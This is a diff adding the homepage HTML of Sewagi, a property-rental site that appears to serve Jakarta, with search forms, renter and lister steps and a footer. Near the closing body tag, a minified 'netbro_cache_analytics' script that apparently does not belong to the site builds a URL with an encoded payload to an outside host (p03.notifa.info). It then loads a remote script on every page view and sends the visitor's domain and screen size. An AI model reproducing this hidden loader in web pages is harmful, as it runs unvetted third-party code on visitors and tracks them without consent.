+            <div class="input-group searchbox-trigger">
+                <div class="input-group-prepend">
+                    <span class="input-group-text location-icon pl-4">A</span>
+                </div>
+                <input type="text" value="" class="form-control searchbox-value" placeholder="Enter location, property name, company or education entity" aria-label="Text input with segmented dropdown button">
+                <div class="input-group-prepend">
+                    <span class="input-group-text"><i class="fas fa-times"></i></span>
+                    <span class="input-group-text"><i class="fas fa-bullseye"></i></span>
+                </div>
+            </div>
+        </div>
+        <ul class="navbar-nav ml-auto">
+            <li class="nav-item">
+                <a class="nav-link" data-toggle="modal" data-target="#modalLogin" >Log In</a>
+            </li>
+            <li class="nav-item">
+                <a class="nav-link primary" href="#">List Your Space &rarr;</a>
+            </li>
+        </ul>
+    </div>
+</div>
+</nav>
+<div class="cookie-policy">
+    <div class="container">
+        <span class="font-size-13">By using this website you agree to our <a href="#">cookie policy</a>.</span>
+        <a class="close-btn" href="javascript:closeCookie();">
+            <i class="fas fa-times"></i>
+        </a>
+    </div>
+</div>
+<section class="home-banner" data-background-color="gradient-1">
+    <div class="home-asset-1"></div>
+    <div class="polygon-2-copy-4"></div>
+    <div class="container">
+        <div class="row home-row">
+            <div class="col-sm-8 offset-md-1 jumbotron align-self-center">
+                <h1 class="mb-5">
+                    <span class="text-color-orange">Find home</span>
+                    <span class="text-color-dark">on your terms.</span>
+                </h1>
+                <div class="input-group input-homepage">
+                    <div class="input-group-prepend searchbox-trigger">
+                        <span class="input-group-text">A</span>
+                    </div>
+                    <input type="text" class="form-control searchbox-trigger searchbox-value" placeholder="Enter location or apartment name">
+                    <div class="input-group-prepend">
+                        <button type="button" class="btn btn-primary searchbox-btn">Discover</button>
+                    </div>
+                </div>
+                <div class="mb-3 font-size-12 text-uppercase recent-search">
+                    Recent Search
+                </div>
+                <div class="mb-4 btn-group-toggle" data-toggle="buttons">
+                    <label class="btn btn-checkbox btn-rounded btn-outline-primary mr-3"><input type="checkbox" />Menteng</label>
+                    <label class="btn btn-checkbox btn-rounded btn-outline-primary mr-3"><input type="checkbox" />1Park Residences</label>
+                </div>
+            </div>
+        </div>
+    </div>
+</section>
+<section class="property">
+    <div class="background-shadow"></div>
+    <div class="container prop-content">
+         <div class="row">
+            <div class="col-12 font-size-32 font-weight-bold">
+                Properties Near Me
+            </div>
+        </div>
+    </div>
+</section>
+<section class="about">
+    <div class="pot-brick"></div>
+    <div class="container">
+        <div class="row justify-content-end">
+            <div class="col-md-8 contents align-self-center">
+                <p class="font-mono font-size-14 mb-3 text-color-orange">WHAT IS SEWAGI?</p>
+                <p class="font-size-32 mb-3 font-weight-bold">SEWAGI lets you rent on your terms &amp; list your property for free.</p>
+            </div>
+        </div>
+    </div>
+</section>
+<section class="info">
+    <div class="background-shadow"></div>
+    <div class="container info-content">
+        <div class="text-center text-uppercase font-size-14 text-color-orange font-mono mt-3">
+            How Sewagi Helps You as a
+        </div>
+        <div class="row info-tab-row">
+            <div id="menu-tabs" class="col-md-12 h3">
+                <ul class="nav nav-tabs tabs-slash justify-content-center padding-bottom-0" role="tablist">
+                    <li class="nav-item">
+                        <a class="nav-link active" data-toggle="tab" href="#renter-tab" role="tab">Renter</a>
+                    </li>
+                    <li class="nav-item">
+                        <a class="nav-link" data-toggle="tab" href="#coliving-tab" role="tab">Co-Living Renter</a>
+                    </li>
+                    <li class="nav-item">
+                        <a class="nav-link" data-toggle="tab" href="#owner-tab" role="tab">Property Lister</a>
+                    </li>
+                </ul>
+            </div>
+        </div>
+        <div class="tab-content pb-5">
+            <div class="tab-pane active show" id="renter-tab" role="tabpanel">
+                <div class="row">
+                    <div class="col-md-3 col-sm-4 col-6">
+    <div class="mb-3 image-card">
+        <img src="http://sewagi-web.inspira.web.id/img/renter_illustrasi1.png" />
+    </div>
+    <p class="mb-3 text-center text-color-dark font-size-20 title-card font-weight-bold">Find and collect the listings you like</p>
+    <p class="mb-3 text-center text-color-gray-1">Check out our listing and refine your filters to get the best match.</p>
+</div>
+                    <div class="col-md-3 col-sm-4 col-6">
+    <div class="mb-3 image-card">
+        <img src="http://sewagi-web.inspira.web.id/img/renter_illustrasi2.png" />
+    </div>
+    <p class="mb-3 text-center text-color-dark font-size-20 title-card font-weight-bold">Schedule for a room tour</p>
+    <p class="mb-3 text-center text-color-gray-1">Have a closer look at your future home. No strings attached.</p>
+</div>
+                    <div class="col-md-3 col-sm-4 col-6">
+    <div class="mb-3 image-card">
+        <img src="http://sewagi-web.inspira.web.id/img/renter_illustrasi3.png" />
+    </div>
+    <p class="mb-3 text-center text-color-dark font-size-20 title-card font-weight-bold">Set up your digital identity</p>
+    <p class="mb-3 text-center text-color-gray-1">Like what you see? Sign the contract and the place is yours.</p>
+</div>
+                    <div class="col-md-3 col-sm-4 col-6">
+    <div class="mb-3 image-card">
+        <img src="http://sewagi-web.inspira.web.id/img/renter_illustrasi4.png" />
+    </div>
+    <p class="mb-3 text-center text-color-dark font-size-20 title-card font-weight-bold">MOVE IN!</p>
+    <p class="mb-3 text-center text-color-gray-1">You are all set! Move in and be part of the community.</p>
+</div>
+                    </div>
+            </div>
+            <div class="tab-pane" id="coliving-tab" role="tabpanel">
+                <div class="row">
+                    <div class="col-md-3 col-sm-4 col-6">
+    <div class="mb-3 image-card">
+        <img src="http://sewagi-web.inspira.web.id/img/renter_illustrasi1.png" />
+    </div>
+    <p class="mb-3 text-center text-color-dark font-size-20 title-card font-weight-bold">Find and collect the listings you like</p>
+    <p class="mb-3 text-center text-color-gray-1">Check out our co-living listing and refine your filters to get the best match.</p>
+</div>
+                    <div class="col-md-3 col-sm-4 col-6">
+    <div class="mb-3 image-card">
+        <img src="http://sewagi-web.inspira.web.id/img/connect.svg" />
+    </div>
+    <p class="mb-3 text-center text-color-dark font-size-20 title-card font-weight-bold">Connect with the existing renters</p>
+    <p class="mb-3 text-center text-color-gray-1">See if you could get along well with the existing renters while visiting your future home.</p>
+</div>
+                    <div class="col-md-3 col-sm-4 col-6">
+    <div class="mb-3 image-card">
+        <img src="http://sewagi-web.inspira.web.id/img/renter_illustrasi3.png" />
+    </div>
+    <p class="mb-3 text-center text-color-dark font-size-20 title-card font-weight-bold">Set up your digital contract</p>
+    <p class="mb-3 text-center text-color-gray-1">Like what you are seeing? Sign the contract and the place is yours.</p>
+</div>
+                    <div class="col-md-3 col-sm-4 col-6">
+    <div class="mb-3 image-card">
+        <img src="http://sewagi-web.inspira.web.id/img/renter_illustrasi4.png" />
+    </div>
+    <p class="mb-3 text-center text-color-dark font-size-20 title-card font-weight-bold">Move in!</p>
+    <p class="mb-3 text-center text-color-gray-1">You are all set! Move in and be part of the community.</p>
+</div>
+                </div>
+            </div>
+            <div class="tab-pane" id="owner-tab" role="tabpanel">
+                <div class="row">
+                    <div class="col-md-3 col-sm-4 col-6">
+    <div class="mb-3 image-card">
+        <img src="http://sewagi-web.inspira.web.id/img/owner1.svg" />
+    </div>
+    <p class="mb-3 text-center text-color-dark font-size-20 title-card font-weight-bold">Tell us about your property</p>
+    <p class="mb-3 text-center text-color-gray-1">Give us better details about your property. The more details the better.</p>
+</div>
+                    <div class="col-md-3 col-sm-4 col-6">
+    <div class="mb-3 image-card">
+        <img src="http://sewagi-web.inspira.web.id/img/owner2.svg" />
+    </div>
+    <p class="mb-3 text-center text-color-dark font-size-20 title-card font-weight-bold">Let us do the heavy lifting</p>
+    <p class="mb-3 text-center text-color-gray-1">Sewagi will help you price it right, market it to the right prospects and take care of the paperwork.</p>
+</div>
+                    <div class="col-md-3 col-sm-4 col-6">
+    <div class="mb-3 image-card">
+        <img src="http://sewagi-web.inspira.web.id/img/owner3.svg" />
+    </div>
+    <p class="mb-3 text-center text-color-dark font-size-20 title-card font-weight-bold">Prove and sign the digital contract</p>
+    <p class="mb-3 text-center text-color-gray-1">Safe the hassle, you could sign the contract digitally.</p>
+</div>
+                    <div class="col-md-3 col-sm-4 col-6">
+    <div class="mb-3 image-card">
+        <img src="http://sewagi-web.inspira.web.id/img/owner4.svg" />
+    </div>
+    <p class="mb-3 text-center text-color-dark font-size-20 title-card font-weight-bold">Get your passive income</p>
+    <p class="mb-3 text-center text-color-gray-1">Kick back and see your income grow.</p>
+</div>
+                </div>
+            </div>
+        </div>
+    </div>
+</section>
+<section class="discover">
+    <div class="container">
+        <div class="row mb-5">
+            <div class="col-12 font-size-32 font-weight-bold text-center">
+                Discover listings that fit you the most
+            </div>
+        </div>
+        <div class="row">
+            <div class="col-sm-4 pt-5 pl-4 pr-4" data-background-color="dark">
+                <div class="banner-tag mb-3" data-background-color="white">Co-Living</div>
+                <div class="mb-3 font-size-13">Willing to share living space with others?</div>
+                <div class="mb-4 font-size-20 font-weight-bold">We can help you find the best housemates match.</div>
+                <a class="btn btn-primary mb-3" href="#">Find me a co-living</a>
+            </div>
+            <div class="col-sm-4 pl-4 pr-4 active-worker" data-background-color="aqua">
+                <div class="banner-tag mb-3" data-background-color="white">Active Worker</div>
+                <div class="mb-3 font-size-13">Can’t find a living space near your office area?</div>
+                <div class="mb-4 font-size-20 font-weight-bold">We have listings within walking distance near your office.</div>
+                <a class="btn btn-primary mb-3" href="#">Find a pad near my office</a>
+            </div>
+            <div class="col-sm-4 pt-5 pl-4 pr-4" data-background-color="orange">
+                <div class="banner-tag mb-3" data-background-color="white">Family Friendly</div>
+                <div class="mb-3 font-size-13">Need a living area for your kids?</div>
+                <div class="mb-4 font-size-20 font-weight-bold">Worry no more. We can provide listings with school nearby.</div>
+                <a class="btn btn-primary mb-3" href="#">Find a pad near school</a>
+            </div>
+        </div>
+    </div>
+</section>
+<section class="property" data-background-color="dark">
+    <div class="container">
+        <div class="row">
+            <div class="col-sm-6">
+                <img class="img-fluid" src="http://sewagi-web.inspira.web.id/img/sofa-asset.png" />
+            </div>
+            <div class="col-sm-6 mt-sm-5 mb-5">
+                <p class="font-mono font-size-14 mb-4 text-color-orange text-uppercase">Are you a property lister?</p>
+                <p class="font-size-32 mb-5 font-weight-bold">Go for effortless leasing as a</p>
+                <div class="row mb-3">
+                    <div class="col-lg-6 col-md-10"><a href="http://sewagi-web.inspira.web.id/property/homeowner" class="btn btn-primary btn-block">Homeowner</a></div>
+                </div>
+                <div class="row mb-3">
+                    <div class="col-lg-6 col-md-10"><a href="http://sewagi-web.inspira.web.id/property/property-agent" class="btn btn-primary btn-block">Property Agent</a></div>
+                </div>
+                <div class="row mb-3">
+                    <div class="col-lg-6 col-md-10"><a href="http://sewagi-web.inspira.web.id/property/building-management" class="btn btn-primary btn-block">Building Management</a></div>
+                </div>
+            </div>
+        </div>
+    </div>
+</section>
+<section class="quote">
+    <div class="polygon-brick"></div>
+    <div class="polygon-dots"></div>
+    <div class="container">
+        <div class="row">
+            <div class="text-center col-12 text-uppercase font-size-14 mb-4 mt-5 text-color-orange font-mono">
+                What Sewagi Users Say
+            </div>
+        </div>
+        <div class="row">
+            <div class="col-sm-8 offset-sm-2 text-center">
+                <p class="font-size-20 font-weight-600 mb-5">Sewagi allows me to handle my property from anywhere. No more spending time in traffic just to sign lease contract.</p>
+                <img class="image-quote" src="http://sewagi-web.inspira.web.id/img/renter_illustrasi1.png"/>
+                <p class="font-size-13 mb-0">George Norton</p>
+                <p class="mb-5">Homeowner</p>
+            </div>
+        </div>
+    </div>
+</section>
+<section class="work position-relative" data-background-color="orange-2">
+    <img class="ornament ornament-top-between ornament-right" src="http://sewagi-web.inspira.web.id/img/painting-asset.png" />
+    <div class="container">
+        <div class="row">
+            <div class="text-center col-12 text-uppercase font-size-14 mb-3 mt-5 text-color-orange font-mono">
+                Work With Us
+            </div>
+        </div>
+        <div class="row">
+            <div class="col-sm-10 offset-sm-1 mb-5 text-center">
+                <p class="font-size-20 font-weight-600 mb-3">Start earning income from real estate deals on your free time</p>
+                <a href="http://sewagi-web.inspira.web.id/working/showing-agent" class="btn btn-primary mb-3">Become a Showing Agent</a>
+                <p class="font-size-20 font-weight-600 mb-3">Increase efficiency by placing your fellow workers near your office or project locations</p>
+                <a href="http://sewagi-web.inspira.web.id/working/company-staff" class="btn btn-primary">Start Placing My Company Staff</a>
+            </div>
+        </div>
+    </div>
+</section>
+    <section class="footer font-size-13" data-background-color="dark">
+    <div class="container pt-5 pb-5">
+        <div class="row">
+            <div class="col-sm-3 col-12 font-weight-600">
+                <p class="text-footer-header">Services</p>
+                <p>Co-living</p>
+                <p>Flexible renting</p>
+                <p>Insurance</p>
+                <p>Property Marketing & Management</p>
+            </div>
+            <div class="col-sm-4 col-12">
+                <p class="text-footer-header">Company</p>
+                <div class="row">
+                    <div class="col-6 font-weight-600">
+                        <p>About us</p>
+                        <p>Ambassadors</p>
+                        <p>Careers</p>
+                        <p>Contact us</p>
+                    </div>
+                    <div class="col-6 font-weight-600">
+                        <p>Explore oportunities</p>
+                        <p>Press</p>
+                        <p>Blogs</p>
+                    </div>
+                </div>
+            </div>
+            <div class="col-sm-4 offset-sm-1">
+                <p class="text-footer-header">Subscribe to our newsletter!</p>
+                <div class="input-group mb-4">
+                    <input type="text" class="form-control" placeholder="What's your email?" aria-label="Text input with segmented dropdown button">
+                    <div class="input-group-prepend">
+                        <button type="button" class="btn btn-primary">Subscribe</button>
+                    </div>
+                </div>
+                <a href="#" class="mr-3 no-style icon icon-med"><i class="fab fa-facebook-square"></i></a>
+                <a href="#" class="mr-3 no-style icon icon-med"><i class="fab fa-twitter"></i></a>
+                <a href="#" class="mr-3 no-style icon icon-med"><i class="fab fa-instagram"></i></a>
+            </div>
+        </div>
+        <hr class="hr-footer" />
+        <div class="row footer-bottom">
+            <nav class="col-sm-9 footer-nav font-weight-600">
+                <ul>
+                    <li><a href="#">FAQ</a></li>
+                    <li><a href="#">Terms of Use</a></li>
+                    <li><a href="#">Privacy Policy</a></li>
+                    <li><a href="#">Trust and safety</a></li>
+                    <li><a href="#">Code of conduct</a></li>
+                </ul>
+            </nav>
+            <div class="col-sm-3 copyright" id="copyright">
+                Sewagi
+                &copy;
+                <script>
+                    document.getElementById('copyright').appendChild(document.createTextNode(new Date().getFullYear()))
+                </script>
+            </div>
+        </div>
+    </div>
+</section>
+    <section id="search-popup">
+    <div class="container">
+        <form id="searchbox-form" action="http://sewagi-web.inspira.web.id/search">
+            <div class="row">
+                <div class='col-md-2 col-10 mb-3 d-flex align-items-center'>
+                    <img class="img-fluid" src="http://sewagi-web.inspira.web.id/images/Logo.svg" />
+                </div>
+                <div class="col-2 mb-3 d-flex d-md-none justify-content-end align-items-center">
+                    <a href="javascript:void(0)" class="searchbox-close">Close</a>
+                </div>
+                <div class='col-md-8 mb-3 d-flex flex-wrap align-items-center'>
+                    <span class="mr-3">I'm interested in</span>
+                    <span class="btn-group-toggle" data-toggle="buttons">
+                        <label class="btn btn-checkbox btn-rounded btn-outline-primary mr-3">
+                            <input type="checkbox" />Co Living
+                        </label>
+                        <label class="btn btn-checkbox btn-rounded btn-outline-primary mr-3">
+                            <input type="checkbox" />Entire Space
+                        </label>
+                    </span>
+                </div>
+                <div class="col-sm-2 mb-3 d-none d-md-flex justify-content-end align-items-center">
+                    <a href="javascript:void(0)" class="searchbox-close">Close</a>
+                </div>
+            </div>
+            <div class="row">
+                <div class="col-md-8 offset-md-2">
+                    <div class="input-group input-homepage mb-4">
+                        <div class="input-group-prepend">
+                            <span class="input-group-text">A</span>
+                        </div>
+                        <input type="text" name="q" class="form-control searchbox-value searchbox-primary"
+                            placeholder="Enter location, property name, company or education entity"
+                            value="">
+                        <div class="input-group-prepend">
+                            <button type="button" class="btn btn-primary searchbox-btn">Discover</button>
+                        </div>
+                    </div>
+                    <p class="mb-3">
+                        <span class="mr-3 mb-3 font-size-12 text-uppercase text-color-gray-6">
+                            Recent Searches
+                        </span>
+                        <span class="mb-3">
+                            <span class="btn-group-toggle" data-toggle="buttons">
+                                <label class="btn btn-checkbox btn-rounded btn-outline-primary mr-3 mb-2">
+                                    <input type="checkbox" />Menteng
+                                </label>
+                                <label class="btn btn-checkbox btn-rounded btn-outline-primary mr-3 mb-2">
+                                    <input type="checkbox" />Park Royale Apartment
+                                </label>
+                                <label class="btn btn-checkbox btn-rounded btn-outline-primary mr-3 mb-2">
+                                    <input type="checkbox" />Lippo Mall Kemang
+                                </label>
+                                <label class="btn btn-checkbox btn-rounded btn-outline-primary mr-3 mb-2">
+                                    <input type="checkbox" />SCBD
+                                </label>
+                            </span>
+                        </span>
+                    </p>
+                    <p class="mb-1">
+                        <span class="mr-3 text-color-dark form-control-style">
+                            Lifestyle
+                        </span>
+                        <span>
+                            <span class="btn-group-toggle" data-toggle="buttons">
+                                <label class="btn btn-checkbox btn-rounded btn-outline-primary mr-3 mb-2">
+                                    <input type="checkbox" />Co Living
+                                </label>
+                                <label class="btn btn-checkbox btn-rounded btn-outline-primary mr-3 mb-2">
+                                    <input type="checkbox" />Active Worker
+                                </label>
+                                <label class="btn btn-checkbox btn-rounded btn-outline-primary mr-3 mb-2">
+                                    <input type="checkbox" />Family Friendly
+                                </label>
+                            </span>
+                        </span>
+                    </p>
+                    <p class="mb-3 text-color-gray-6">
+                        If you have specific requests, let's filter out your needs.
+                    </p>
+                    <p class="mb-3 text-color-dark form-control-style">
+                        Property Type
+                    </p>
+                    <p class="pl-3">
+                        <span class="btn-group-toggle" data-toggle="buttons">
+                            <label class="btn btn-checkbox btn-rounded btn-outline-primary mr-3">
+                                <input type="checkbox" />Apartment
+                            </label>
+                            <label class="btn btn-checkbox btn-rounded btn-outline-primary mr-3">
+                                <input type="checkbox" />House
+                            </label>
+                        </span>
+                    </p>
+                    <div class="d-flex align-items-center mb-3">
+                        <span class="text-color-dark form-control-style mr-auto">Add commute time</span>
+                        <button class="btn btn-outline-primary btn-icon collapse-icon collapsed" data-target="#collapse-commute-time" data-toggle="collapse"><i class="fas fa-plus"></i></button>
+                    </div>
+                    <div id="collapse-commute-time" class="collapse" data-background-color="white">
+                        <div class="row pl-3 pr-3 pt-3">
+                            <div class="col-sm-2 col-3 d-flex align-items-center mb-3">
+                                <select class="form-control input-aqua">
+                                    <option>5 min</option>
+                                </select>
+                            </div>
+                            <div class="col-1 d-flex align-items-center mb-3">to</div>
+                            <div class="col-sm-6 col-8 d-flex align-items-center mb-3">
+                                <div class="input-group input-aqua">
+                                    <div class="input-group-prepend">
+                                        <span class="input-group-text">A</span>
+                                    </div>
+                                    <input type="text" class="form-control" placeholder="Add detail location">
+                                </div>
+                            </div>
+                            <div class="col-1 d-flex align-items-center mb-3">by</div>
+                            <div class="col-sm-2 col-3 d-flex align-items-center mb-3">
+                                <select class="form-control input-aqua">
+                                    <option>Walk</option>
+                                </select>
+                            </div>
+                        </div>
+                        <div class="row">
+                            <div class="col-sm-9 col-8 offset-sm-3 offset-4">
+                                <div class="mr-3 mb-3 font-size-12 text-uppercase text-color-gray-6">
+                                    or a Landmark
+                                </div>
+                                <div class="mb-3">
+                                    <span class="btn-group-toggle" data-toggle="buttons">
+                                        <label class="btn btn-checkbox btn-rounded btn-outline-primary mr-3 mb-2">
+                                            <input type="checkbox" />
+                                            Bundaran HI<br/>
+                                            <span class="font-weight-normal">Central Jakarta</span>
+                                        </label>
+                                        <label class="btn btn-checkbox btn-rounded btn-outline-primary mr-3 mb-2">
+                                            <input type="checkbox" />
+                                            Kelapa Gading Mall
+                                            <br/><span class="font-weight-normal">North Jakarta</span>
+                                        </label>
+                                        <label class="btn btn-checkbox btn-rounded btn-outline-primary mr-3 mb-2">
+                                            <input type="checkbox" />
+                                            Central Park Mall
+                                            <br/><span class="font-weight-normal">West Jakarta</span>
+                                        </label>
+                                        <label class="btn btn-checkbox btn-rounded btn-outline-primary mr-3 mb-2">
+                                            <input type="checkbox" />
+                                            Bassura City Mall
+                                            <br/><span class="font-weight-normal">East Jakarta</span>
+                                        </label>
+                                        <label class="btn btn-checkbox btn-rounded btn-outline-primary mr-3 mb-2">
+                                            <input type="checkbox" />
+                                            Cilandak Town Square<br/>
+                                            <span class="font-weight-normal">South Jakarta</span>
+                                        </label>
+                                        <label class="btn btn-checkbox btn-rounded btn-outline-primary mr-3 mb-2">
+                                            <input type="checkbox" />
+                                            Lippo Mall Kemang
+                                            <br/><span class="font-weight-normal">South Jakarta</span>
+                                        </label>
+                                        <label class="btn btn-checkbox btn-rounded btn-outline-primary mr-3 mb-2">
+                                            <input type="checkbox" />
+                                            Mega Kuningan
+                                            <br/><span class="font-weight-normal">Business District</span>
+                                        </label>
+                                        <label class="btn btn-checkbox btn-rounded btn-outline-primary mr-3 mb-2">
+                                            <input type="checkbox" />
+                                            SCBD
+                                            <br/><span class="font-weight-normal">Business District</span>
+                                        </label>
+                                    </span>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                    <p class="mb-3 text-color-dark form-control-style">
+                        Range budget per month
+                    </p>
+                    <div id="searchbox-slider" class="mb-3"></div>
+                    <div class="d-flex mb-5">
+                        <span class="mr-auto">IDR 400.000</span>
+                        <span>IDR 3.342.000</span>
+                    </div>
+                </div>
+            </div>
+        </form>
+    </div>
+</section>
+    <script src="http://sewagi-web.inspira.web.id/plugins/nouislider/nouislider.min.js"></script>
+    <script src="http://sewagi-web.inspira.web.id/js/app.js" type="text/javascript"></script>
+    <script>
+function closeCookie(){
+    $('.cookie-policy').remove();
+}
+</script>
+ <script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p03.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582JKzDzTsXZH2B6VAoQZNXPSZR501PhW7q2UNS2BeQpuQSNIN%2fUUYlabQNKyEYEtTkZgFgXcKRD3RcW%2bOo4%2fg1hIHoV5XRKnfrnm5i5z6%2fKcc7zj6Tf8c9OeCj%2bVVJS8z96yA3gctbLLNZvSfqJ3dqZCcrGhhjV6FRqh3J%2bsD%2bbnWJZ8PkGTk3gV%2f2xZb7r3K5G8X41vRvrv5bYESUoqX5I5tZ1WOhPeAqHn1ZHyiTYe1Xmj0NO9Sd2gTePNcnW7O7LWeT0EQZYUuLG4TIGvCyVXXStObBfuJYoqeWvi4qYSq9lmUP4IrRrDFUpJHW5X3BIJDBZgmkgREstuh2l6bNBVJD3egp1oshH3OXul5avLEJuNmGA%2bnSgnc%2fTJScLvhUFAzRis7WQgk0jU6Qbi%2bfqRd25Cxo6a%2bNm5B85lk0MPFDZ05Q%2fMlAaUtHlfi359oEUmo6nmYKDDLXDTOdsUXnH04co%2fAuUAa9ulnfGWore7Xhlp94MpAw8CjEjHDvIg4fI3KswMFdRLvyGxUVHFAImE%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
+
+
+
+<script type="text/javascript" src="../js/sewagi.js"></script>
+
+<script>
+$('#modalLogin').modal('show');
+</script>
+
+</html>
